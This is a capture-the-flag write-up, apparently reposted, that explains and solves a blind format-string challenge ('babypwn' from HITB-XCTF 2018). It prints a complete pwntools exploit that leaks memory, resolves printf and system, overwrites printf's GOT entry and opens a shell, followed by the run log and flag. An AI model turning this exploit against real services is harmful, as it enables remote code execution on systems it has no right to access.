---
title: 'blind attack:HITB-XCTF Quals 2018 - babypwn'
date: 2018-04-20 22:17:22
categories: pwn
tags: [ctf,format string]
---

From [https://fbesnard.com/2018/04/13/HITB-XCTF-Quals-2018-babypwn/](https://fbesnard.com/2018/04/13/HITB-XCTF-Quals-2018-babypwn/)

## Challenge description

nc 47.75.182.113 9999

## Challenge resolution

### Introducing ourselves

Using netcat to connect to the challenge, we are greeted with the following message :

```
florent@kali:~# nc 47.75.182.113 9999
<NOTHING...>
```

Very talkative server, I appreciate that…
Maybe we should introduce ourselves :

```
florent@kali:~# nc 47.75.182.113 9999
Hello, I'm Florent             # My input
Hello, I'm Florent             # Server's reply
```

So, it seems that the server is sending our input back to us (or is called Florent as well, which is likely not the case…).
At this point, one of the possible vulnerabilities that comes to our mind is a format string vulnerability :

```
florent@kali:~# nc 47.75.182.113 9999
Hello, I'm Florent
Hello, I'm Florent
%p %p %p %p %p                                                     # My input
(nil) (nil) 0x7f2a89d352f0 0x7f2a8a02f780 0x7f2a8a256700           # Server's reply
```

By sending `%p` to the server, it replies to us with an address to which a pointer refers.
Unfortunately for us, we don’t have access to the binary or its source code.
But here we are : a blind format string vulnerability !

### Further knowing the server (or getting our hands dirty)

Now it’s time to find a way to grab the flag.
I’ve already played with format strings vulnerabilities but never blindly.
While looking on the net for information on how I could efficiently leak usable addresses from the binary, I came across a challenge from the 33c3 CTF entitled `Eat, Sleep Pwn, Repeat` or `ESPR` (which is also the name of the German team which organized the 33c3 CTF).
The situation is pretty much the same and I started looking at write-ups of the challenge.
I stumbled across these 2 excellent ressources that I encourage you to take a look at :

- [Write-up from @jay_f0xtr0t:](https://github.com/InfoSecIITR/write-ups/blob/master/2016/33c3-ctf-2016/pwn/espr/README.md)
- [Video from @LiveOverflow:](https://youtu.be/XuzuFUGuQv0)

In order to solve the challenge, I used the script from [@jay_f0xtr0t](https://twitter.com/jay_f0xtr0t) ([available here](https://github.com/InfoSecIITR/write-ups/blob/master/2016/33c3-ctf-2016/pwn/espr/espr.py)) that I adapted a little bit.

Below is the explanation of what the different parts of the code do :

First, we connect to the challenge (obviously) and set the architecture accordingly.
The challenge is a 64-bit binary : our `%p` inputs reveal addresses like `0x7f2a8a02f780` which start with `0x7f` and are 6 bytes long.

```python
from pwn import *

conn = remote('47.75.182.113', 9999)
context.update(arch = 'amd64', os = 'linux')
```

The `exec_payload` function is the function that exploits the format string vulnerability strictly speaking.
We prepend an arbitrary value (`_EOF` in this case but it could have been something else…) to our payload and the function will parse the server’s response until it reaches our value.
We ignore `\n` because if the server is using the `gets` function (or similar) for reading our input, the fact that there is a newline character will cause a weird behaviour : the function will replace `\n` with `\x00` (null byte) and we will get the output twice.

```python
def exec_payload(payload):
    if '\n' in payload:
        return ""
    conn.sendline("_EOF" + payload)
    conn.recvuntil("_EOF")
    data = conn.recv()
    return data
```

The `find_elf` function attempts to find an address that might be in the ELF binary.
To do so, it looks for an address starting with `0x400` (because `0x400000` is the default base address for binaries).
The address that we find will be useful later when we will use the `DynELF` function from PwnTools.

```python
def find_elf(depth):
    log.info('Finding ELF. This might take a few seconds...')
    for i in xrange(1, depth + 1):
        data = exec_payload('%' + str(i) + '$p')
        if (len(data) == 8 and data[0:5] == '0x400'):
			log.success('FOUND ELF !')
			return int(data, 16)
```

The `find_leak_point` function attempts to find the correct offset so that our input refers to itself and is sent back to us.

```python
def find_leak_point():
    log.info('Finding leak point')
    for i in xrange(1, 200):
        r = exec_payload('%' + str(i) + '$p' + 'AAAAAAAA' + 'BBBBBBBB')
        if '0x4242424242424242' in r: # chr(0x42) = 'B'
            return i
```

The `leak` function leaks data from the address given as argument.
Some workarounds were made by the initial creator to handle the case of the special `\n` that we previously mentionned.

```python
def leak(addr):
    addr &= (2**64 - 1)
    r = exec_payload('%' + str(leak_point) + '$s' + 'XXXXXXXX' + p64(addr))
    if r == '':
        return ''
    r = r[:r.index('XXXXXXXX')]
    if r == '(null)':
        return '\x00'
    else:
        return r + '\x00'
```

Now using [`DynELF`](http://docs.pwntools.com/en/stable/dynelf.html) from PwnTools, we can find the addresses of the `printf` and `system`functions.
The idea behind this is to overwrite the `printf` address from the Global Offset Table (GOT) with the one from `system`.
By doing so, when the server will attempt to reply to our request, it will use the `system` function instead of the `printf` function and thus execute the payload we send.

```python
d = DynELF(leak, start_address_elf)
dynamic_addr = d.dynamic
printf_addr = d.lookup('printf', 'libc')
system_addr = d.lookup('system', 'libc')
```

The `find_plt_got` function attempts to find the address of the GOT inside the Procedure Linkage Table (PLT).
Indeed, the addresses for the `printf` and `system` functions we found before are in reality jumps to other addresses.
So if we find the GOT, we will be able to have the real address of the `printf`function from the GOT.
If you don’t get this point, you may want to take a look at [this video](https://www.youtube.com/watch?v=kUk5pw4w0h4) from [@LiveOverflow](https://twitter.com/liveoverflow).

```python
def find_plt_got():
    addr = dynamic_addr
    while True:
        x = d.leak.n(addr, 2)
        if x == '\x03\x00': # PLT/GOT
            addr += 8
            return u64(d.leak.n(addr, 8))
        addr += 0x10

def find_printf():
    addr = got_addr
    while True:
        x = d.leak.n(addr, 8)
        if x == p64(printf_addr):
            return addr
        addr += 8
```

The `forge_exploit` function generates the final payload to be send to the server, replacing the value at the given address by the one we choose.

```python
def forge_exploit(addr, val):
    ret = ''
    curout = 4
    dist_to_addr = 12 + 8*20
    reader = (dist_to_addr / 8) + 7
    for i in range(8):
        diff = (val & 0xff) - curout
        curout = (val & 0xff)
        val /= 0x100
        if diff < 20:
            diff += 0x100
        ret += '%0' + str(diff) + 'u'
        ret += '%' + str(reader) + '$hhn'
        reader += 1
    ret += 'A'*(dist_to_addr - len(ret))
    for i in range(8):
        ret += p64(addr + i)
    return ret
```

Below is the full exploit code :

```python
#!/usr/bin/python

from pwn import *

conn = remote('47.75.182.113', 9999)
context.update(arch = 'amd64', os = 'linux')

DEPTH = 100

def exec_payload(payload):
    if '\n' in payload:
        return ""
    conn.sendline("_EOF" + payload)
    conn.recvuntil("_EOF")
    data = conn.recv()
    return data


def find_elf(depth):
    log.info('Finding ELF. This might take a few seconds...')
    for i in xrange(1, depth + 1):
        data = exec_payload('%' + str(i) + '$p')
        if (len(data) == 8 and data[0:5] == '0x400'):
			log.success('FOUND ELF !')
			return int(data, 16)

start_address_elf = find_elf(DEPTH)
log.info('Using address %s' % hex(start_address_elf))


def find_leak_point():
    log.info('Finding leak point')
    for i in xrange(1, 200):
        r = exec_payload('%' + str(i) + '$p' + 'AAAAAAAA' + 'BBBBBBBB')
        if '0x4242424242424242' in r: # chr(0x42) = 'B'
            return i

leak_point = find_leak_point()
log.success('FOUND leak point %d' % leak_point)

def leak(addr):
    addr &= (2**64 - 1)
    r = exec_payload('%' + str(leak_point) + '$s' + 'XXXXXXXX' + p64(addr))
    if r == '':
        return ''
    r = r[:r.index('XXXXXXXX')]
    if r == '(null)':
        return '\x00'
    else:
        return r + '\x00'

d = DynELF(leak, start_address_elf)
dynamic_addr = d.dynamic
printf_addr = d.lookup('printf', 'libc')
system_addr = d.lookup('system', 'libc')

def find_plt_got():
    addr = dynamic_addr
    while True:
        x = d.leak.n(addr, 2)
        if x == '\x03\x00': # type PLTGOT
            addr += 8
            return u64(d.leak.n(addr, 8))
        addr += 0x10

got_addr = find_plt_got()
log.success('FOUND GOT Address: %s' % hex(got_addr))

def find_printf():
    addr = got_addr
    while True:
        x = d.leak.n(addr, 8)
        if x == p64(printf_addr):
            return addr
        addr += 8

printf_got = find_printf()
log.success('FOUND printf@GOT : %s' % hex(printf_got))

def forge_exploit(addr, val):
    ret = ''
    curout = 4
    dist_to_addr = 12 + 8*20
    reader = (dist_to_addr / 8) + 7
    for i in range(8):
        diff = (val & 0xff) - curout
        curout = (val & 0xff)
        val /= 0x100
        if diff < 20:
            diff += 0x100
        ret += '%0' + str(diff) + 'u'
        ret += '%' + str(reader) + '$hhn'
        reader += 1
    ret += 'A'*(dist_to_addr - len(ret))
    for i in range(8):
        ret += p64(addr + i)
    return ret

log.info("SENDING PAYLOAD, PEW PEW !!!")
exec_payload(forge_exploit(printf_got, system_addr))
conn.sendline('/bin/sh')

log.success("ENJOY YOUR SHELL :)")
conn.interactive()

conn.close()
```

### Revealing its secret

It’s now time to run our exploit :

```shell
florent@kali:~# python exploit.py

[+] Opening connection to 47.75.182.113 on port 9999: Done
[*] Finding ELF. This might take a few seconds...
[+] FOUND ELF !
[*] Using address 0x40076d
[*] Finding leak point
[+] FOUND leak point 8
[!] No ELF provided.  Leaking is much faster if you have a copy of the ELF being leaked.
[*] PT_DYNAMIC
[*] PT_DYNAMIC header = 0x400040
[*] PT_DYNAMIC count = 0x9
[*] PT_DYNAMIC @ 0x600e20
[+] Resolving 'printf' in 'libc.so': 0x7f02b722e168
[*] Trying lookup based on Build ID: b5381a457906d279073822a5ceb24c4bfef94ddb
[*] Skipping unavialable libc b5381a457906d279073822a5ceb24c4bfef94ddb
[*] .gnu.hash/.hash, .strtab and .symtab offsets
[*] Found DT_GNU_HASH at 0x7f02b7000c00
[*] Found DT_STRTAB at 0x7f02b7000c10
[*] Found DT_SYMTAB at 0x7f02b7000c20
[*] .gnu.hash parms
[*] hash chain index
[*] hash chain
[*] Found DT_GNU_HASH at 0x7f02b7000c00
[*] Found DT_STRTAB at 0x7f02b7000c10
[*] Found DT_SYMTAB at 0x7f02b7000c20
[*] .gnu.hash parms
[*] hash chain index
[*] hash chain
[+] FOUND GOT Address: 0x601000
[+] FOUND printf@GOT : 0x601020
[*] SENDING PAYLOAD, PEW PEW !!!
[+] ENJOY YOUR SHELL :)
[*] Switching to interactive mode
$ ls
babypwn
bin
dev
flag
lib
lib32
lib64
$ cat flag
HITB{Baby_Pwn_BabY_bl1nd}
```